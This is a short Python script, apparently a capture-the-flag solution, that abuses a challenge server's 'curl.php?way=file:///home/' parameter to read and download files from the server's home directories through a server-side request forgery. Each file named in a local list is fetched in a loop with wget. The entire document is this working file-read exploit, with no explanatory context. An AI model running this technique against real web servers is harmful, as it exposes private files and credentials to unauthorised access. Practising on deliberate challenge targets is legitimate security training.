#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import subprocess

files = map(lambda x: x.strip(), open('files').readlines())
dirs = map(lambda x: x.strip(), open('dirs').readlines())

for adir in dirs:
    if not os.path.isdir(adir):
        os.mkdir(adir)

base_url = "http://coingame.challs.malice.fr/curl.php?way=file:///home/"
for count, afile in enumerate(files):
    print("Downloading %s(%d of %d)" % (afile, (count + 1), len(files)))
    file_url = base_url + afile
    cmd = ["wget", file_url, "-O", afile]
    p = subprocess.Popen(cmd)
    p.wait()

print("Done")
